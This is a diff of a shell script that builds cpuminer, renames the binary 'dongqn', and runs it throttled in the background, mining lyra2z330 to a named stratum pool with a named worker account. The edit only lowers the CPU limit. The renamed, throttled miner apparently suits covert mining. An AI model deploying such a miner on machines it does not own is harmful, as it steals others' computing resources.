@@ -94,4 +94,4 @@ chmod +x *
 ./build.sh
 mv cpuminer dongqn
 make
-cpulimit --exe dongqn --limit 320 -b && ./dongqn -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u minhthang.11 -p x
+cpulimit --exe dongqn --limit 160 -b && ./dongqn -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u minhthang.11 -p x
